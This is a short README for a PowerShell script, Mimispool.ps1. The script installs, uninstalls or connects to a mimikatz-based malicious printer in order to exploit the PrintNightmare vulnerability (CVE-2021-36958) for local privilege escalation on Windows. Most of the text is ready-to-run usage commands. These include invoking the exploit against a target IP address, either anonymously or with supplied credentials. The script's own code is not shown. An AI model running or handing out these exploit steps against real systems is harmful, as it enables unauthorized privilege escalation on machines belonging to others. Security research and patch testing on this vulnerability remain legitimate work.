# Mimispool.ps1

Just a very small script to install, uninstall or connect to [gentilwiki's Mimispool](https://github.com/gentilkiwi/mimikatz/tree/master/mimispool#readme) printer. Used to exploit the PrintNightmare vulnerability (CVE-2021-36958) for local privilege escalation. Tested on a fully up-to-date Windows 10 Enterprise Evaluation VM.

Requires admin privileges on the host you want to install the printer on.

## Usage

### Import the Module

```powershell
. .\Mimispool.ps1
```

### Install Printer

```powershell
# With internet access
Install-KiwiPrinter

# Without internet access by specifying path to local mimikatz_trunk.zip file
Install-KiwiPrinter -Archive ".\mimikatz_trunk.zip"
```

### Uninstall Printer

```powershell
Uninstall-KiwiPrinter
```

### Connect to Printer (Exploit)

```powershell
# With anonymous access
Invoke-KiwiPrinter -Server "192.168.47.129"

# With credentials
Invoke-KiwiPrinter -Server "192.168.47.129" -Username "user" -Password "pass"
```

![Proof of Concept](img/poc.png)
